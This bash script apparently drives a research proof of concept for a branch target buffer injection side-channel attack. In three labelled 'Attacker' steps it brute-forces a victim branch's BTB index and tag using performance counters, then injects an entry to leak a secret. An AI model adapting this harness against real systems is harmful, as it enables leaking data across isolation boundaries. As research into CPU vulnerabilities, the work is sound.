#!/bin/bash

usage() {
    echo "Usage: $0 mode=run/asm [core_id=VALUE] [perf_cts=VALUE]"
}

if [ "$#" -lt 1 ]; then
    usage
    exit 1
fi

#default value
mode="run"
core_id=0
perf_cts=204,211

for arg in "$@"; do
    key=$(echo $arg | cut -f1 -d=)
    value=$(echo $arg | cut -f2 -d=)

    case $key in
        mode)
            if [[ "$value" == "run" || "$value" == "asm" ]]; then
                mode=$value
            else
                echo "Error: mode must be one of 'run' or 'asm'."
                usage
                exit 1
            fi
            ;;
        core_id)
            core_id=$value
            ;;
        perf_cts)
            perf_cts=$value
            ;;
        *)
            echo "Warning: Ignoring unrecognized option '$key'."
            ;;
    esac
done


if [[ "$mode" == "run" ]]; then
    output_file=results.out
else
    output_file=x_test.asm
fi

echo "Running in mode: $mode"
echo "Basic options - core_id: $core_id, perf_cts: $perf_cts, output_file: $output_file"

PMC_DIR=../../utils/src_pmc
(cd $PMC_DIR && . vars.sh)

python3 PHR_maker.py victim PHR0 184
python3 PHR_maker.py victim PHR1 384

random_part1=$(( ($RANDOM) << 16 ))
random_part2=$(( ($RANDOM)  & (2**15 - 1) ))
random_31bit=$(($random_part1 | $random_part2))
sec_victim_ibranch_addr=$(( $random_31bit<<16 ))
sec_victim_ibranch_addr_hex=$(printf "0x%X" $sec_victim_ibranch_addr)
victim_pc_14to12=$(( ($RANDOM) % 8 ))

secret=5
pc_31to24=0
pc_23to15=0
pc_14to12=0
pc_11_to_5=100

g++ -O2 -c -m64 -oa.o $PMC_DIR/PMCTestA_poc.cpp
if [[ "$mode" == "run" ]]; then
    echo "Performing run mode operations..."
    ## Step 1: Extract BTB index
    output_file=results_step1.out
    pc_11to5=100
    link_script_file=script.ld
    repeat0_input=2
    ld --verbose > $link_script_file
    python3 gen_linker_script.py $link_script_file 0 0 $sec_victim_ibranch_addr_hex
    echo -e "\n@   repeat0: $repeat0_input" > $output_file
    echo -e "\n@@     Clock      BrRetired     BrClear" >> $output_file
    for (( i=0; i<=7; ++i ))
    do
        echo -e "\n@@@-------PC[14:12]=$i-------\n" >> $output_file
        nasm -f elf64 -o b64_step1.o -i$PMC_DIR/ \
            -Dcounters=$perf_cts \
            -Dpc_14to12=$i \
            -Dpc_11to5=$pc_11to5 \
            -Dvictim_pc_14to12=$victim_pc_14to12 \
            -Dsec_victim_ibranch_addr=$sec_victim_ibranch_addr_hex \
            -Dsecret=$secret \
            -Drepeat0_input=$repeat0_input \
            -Pstep1_BTB_index.nasm \
            $PMC_DIR/TemplateB64.nasm

        g++ -T $link_script_file -no-pie -flto a.o b64_step1.o -o x_step1 -lpthread -lrt
        taskset -c $core_id ./x_step1 >> $output_file

        IFS=',' read -r pc_14to12 br_clear <<< $(python3 parse_step1.py)
        # echo "PC[14:12]: $pc_14to12, BrClear: $br_clear"
        if (( $br_clear > 2000 )); then
            echo "Attacker Step 1 - PC[14:12]: $pc_14to12, BrClear: $br_clear"
            break
        fi
    done

    ## Step 2: Extract BTB tag
    output_file=results_step2.out
    link_script_file=script.ld
    repeat0_input=2
    begin=0 end=511
    echo -e "\n@   repeat0: $repeat0_input" > $output_file
    echo -e "\n@@     Clock      BrRetired     BrClear" >> $output_file
    for (( i=$begin; i<=$end; ++i ))
    do
        pc_23to15=$i
        ld --verbose > $link_script_file
        python3 gen_linker_script.py $link_script_file 0 $pc_23to15 $sec_victim_ibranch_addr_hex
        echo -e "\n@@@-------PC[23:15]=$i-------\n" >> $output_file
        nasm -f elf64 -o b64_step2.o -i$PMC_DIR/ \
            -Dcounters=$perf_cts \
            -Dpc_14to12=$pc_14to12 \
            -Dpc_11to5=$pc_11to5 \
            -Dvictim_pc_14to12=$victim_pc_14to12 \
            -Dsec_victim_ibranch_addr=$sec_victim_ibranch_addr_hex \
            -Dsecret=$secret \
            -Drepeat0_input=$repeat0_input \
            -Pstep2_BTB_tag.nasm \
            $PMC_DIR/TemplateB64.nasm
        g++ -T $link_script_file -no-pie -flto -m64 a.o b64_step2.o -o x_step2 -lpthread -lrt
        taskset -c $core_id ./x_step2 >> $output_file
        
        IFS=',' read -r pc_23to15 br_clear <<< $(python3 parse_step2.py)
        # echo "PC[23:15]: $pc_23to15, BrClear: $br_clear"
        if (( $br_clear < 100 )); then
            echo "Attacker Step 2 - PC[23:15]: $pc_23to15, BrClear: $br_clear"
            break
        fi
    done

    ## Step 3: Inject BTB
    python3 PHR_maker.py attacker PHR0 184
    python3 PHR_maker.py attacker PHR1 384
    output_file=results_step3.out
    link_script_file=script.ld
    repeat0_input=2
    perf_cts=320,205,206
    begin=0 end=255
    echo -e "\n@   repeat0: $repeat0_input" > $output_file
    echo -e "\n@@   Clock      L2_Miss     BrIndir     BrMispInd" >> $output_file
    for (( i=$begin; i<=$end; ++i ))
    do
        pc_31to24=$i
        sec_attacker_ibranch_addr=$((1<<32 | pc_31to24<<24 | pc_23to15<<15))
        sec_attacker_ibranch_addr_hex=$(printf "0x%X" $sec_attacker_ibranch_addr)
        # echo "$sec_attacker_ibranch_addr_hex"
        ld --verbose > $link_script_file
        python3 gen_linker_script.py $link_script_file $pc_31to24 $pc_23to15 $sec_victim_ibranch_addr_hex
        echo -e "\n@@@-------PC[31:24]=$i-------\n" >> $output_file
        nasm -f elf64 -o b64_step3.o -i$PMC_DIR/ \
            -Dcounters=$perf_cts \
            -Dpc_14to12=$pc_14to12 \
            -Dpc_11to5=$pc_11to5 \
            -Dvictim_pc_14to12=$victim_pc_14to12 \
            -Dsec_victim_ibranch_addr=$sec_victim_ibranch_addr_hex \
            -Dsec_attacker_ibranch_addr=$sec_attacker_ibranch_addr_hex \
            -Dsecret=$secret \
            -Drepeat0_input=$repeat0_input \
            -Pstep3_BTB_injection.nasm \
            $PMC_DIR/TemplateB64.nasm
        g++ -T $link_script_file -no-pie -flto -m64 a.o b64_step3.o -o x_step3 -lpthread -lrt
        taskset -c $core_id ./x_step3 >> $output_file
        
        IFS=',' read -r pc_31to24 l2_miss <<< $(python3 parse_step3.py)
        # echo "PC[31:24]: $pc_31to24, L2_Miss: $l2_miss"
        if (( $l2_miss < 100 )); then
            echo "Attacker Step 3 - PC[31:24]: $pc_31to24, L2_Miss: $l2_miss"
            break
        fi
    done
else
    echo "Performing asm mode operations..."
    objdump -d ./x_step1 > $output_file
fi
